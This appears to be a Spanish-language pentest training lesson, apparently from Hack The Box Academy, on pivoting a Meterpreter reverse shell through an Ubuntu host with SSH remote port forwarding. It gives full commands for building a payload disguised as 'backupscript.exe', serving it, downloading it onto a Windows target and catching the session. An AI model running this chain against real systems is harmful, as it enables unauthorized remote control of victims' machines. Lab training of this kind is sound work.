
# Remote/Reverse Port Forwarding con SSH

Hemos visto el reenvío de puertos local, donde SSH puede escuchar en nuestro host local y reenviar un servicio en el host remoto a nuestro puerto, y el reenvío de puertos dinámico, donde podemos enviar paquetes a una red remota a través de un host dinámico. Pero a veces es posible que también queramos reenviar un servicio local al puerto remoto. Consideremos el escenario en el que podemos realizar RDP en el host de Windows `Windows A`. Como se puede ver en la imagen a continuación, en nuestro caso anterior, podíamos acceder al host de Windows a través del servidor Ubuntu.

![](https://academy.hackthebox.com/storage/modules/158/33.png)

### Pero ¿qué pasa si intentamos obtener una Reverse Shell?

El host de conexión saliente de Windows solo está limitado a la red `172.16.5.0/23`. Esto se debe a que el host de Windows no tiene ninguna conexión directa con la red en la que se encuentra el host del ataque. Si iniciamos un detector Metasploit en nuestro host de ataque e intentamos obtener un shell inverso, no podremos obtener una conexión directa aquí porque el servidor de Windows no sabe cómo enrutar el tráfico que sale de su red (`172.16.5.0/ 23`) para llegar a 10.129.xx (la red Academy Lab).

Hay varias ocasiones durante una prueba de penetración en las que no es factible tener solo una conexión de escritorio remoto. Es posible que desee utilizar archivos `upload`/ `download`(cuando el portapapeles RDP está deshabilitado) `usar exploits` o utilizar una sesión de Meterpreter para realizar la enumeración en el host de Windows, lo cual no es posible utilizando los [ejecutables](https://lolbas-project.github.io/) `low-level Windows API` integrados de Windows .

En estos casos, tendríamos que encontrar un host pivot, que es un punto de conexión común entre nuestro host de ataque y el servidor de Windows. En nuestro caso, nuestro host pivote sería el servidor Ubuntu ya que puede conectarse a ambos: `nuestra máquina de atacante` y `el objetivo Windows`. Para obtener un `shell Meterpreter` en Windows, crearemos un payload HTTPS de Meterpreter usando `msfvenom`, pero la configuración de la conexión inversa para el payload será la dirección IP del host del servidor Ubuntu ( `172.16.5.129`). Usaremos el puerto 8080 en el servidor Ubuntu para reenviar todos nuestros paquetes inversos al puerto 8000 de nuestros hosts de ataque, donde se ejecuta nuestro oyente Metasploit.

### **Creando un payload de Windows con msfvenom**

```shell-session
afsh4ck@kali$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <IP-interna-del-host-de-pivoting> -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 712 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

### **Configuración e inicio del multi/handler**

```bash
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```

Una vez que se crea nuestra carga útil y tenemos nuestro oyente configurado y en ejecución, podemos copiar la carga útil al servidor Ubuntu usando el comando `scp` ya que ya tenemos las credenciales para conectarnos al servidor Ubuntu usando SSH.

### **Transferencia del payload al host de pivoting**

```shell-session
afsh4ck@kali$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

backupscript.exe                                   100% 7168    65.4KB/s   00:00 
```

### **Iniciando el servidor web Python3 en Pivot Host**

```shell-session
ubuntu@Webserver$ python3 -m http.server 8123
```

**Descarga del payload desde Windows Target**

Podemos descargar `backupscript.exe` desde el host de Windows a través de un navegador web o el cmdlet de PowerShell `Invoke-WebRequest`.

```powershell
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

Una vez que hayamos descargado nuestro payload en el host de Windows, usaremos `SSH remote port forwarding` para reenviar conexiones desde el puerto 8080 del servidor Ubuntu al servicio de escucha de nuestra msfconsole en el puerto 8000. Usaremos el argumento `-vN` en nuestro comando SSH para hacerlo detallado y pedirle que no solicite el shell de inicio de sesión. El comando `-R` le pide al servidor Ubuntu que escuche `<targetIPaddress>:8080`y reenvíe todas las conexiones entrantes en el puerto `8080`a nuestro oyente msfconsole en `0.0.0.0:8000`nuestro `attack host`.

### **Usando SSH -R**

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

{% endcode %}

Después de crear el reenvío del puerto remoto SSH, podemos ejecutar el payload desde el destino de Windows. Si el payload se ejecuta según lo previsto e intenta conectarse nuevamente a nuestro oyente, podemos ver los registros del pivote en el host pivote.

### **Ver los registros desde el pivote**

```shell-session
ebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
debug1: channel 1: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: free: 172.16.5.19, nchannels 2
debug1: channel 1: connected to 0.0.0.0 port 8000
debug1: channel 1: free: 172.16.5.19, nchannels 1
debug1: client_input_channel_open: ctype forwarded-tcpip rchan 2 win 2097152 max 32768
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61356
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=4
debug1: channel 0: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: connected to 0.0.0.0 port 8000
```

Si todo está configurado correctamente, recibiremos un shell de Meterpreter pivotado a través del servidor Ubuntu.

### **Sesión de Meterpreter establecida**

```shell-session
[*] Started HTTPS reverse handler on https://0.0.0.0:8000
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1 ) at 2022-03-02 10:48:10 -0500

meterpreter > shell
Process 3236 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```

Nuestra sesión de Meterpreter debería indicar que nuestra conexión entrante proviene de un host local ( `127.0.0.1`), ya que estamos recibiendo la conexión a través de un `local SSH socket`, que creó una conexión `outbound` al servidor Ubuntu. El comando `netstat` puede mostrarnos que la conexión entrante es del servicio SSH.

La siguiente representación gráfica proporciona una forma alternativa de entender esta técnica.

![](https://academy.hackthebox.com/storage/modules/158/44.png)
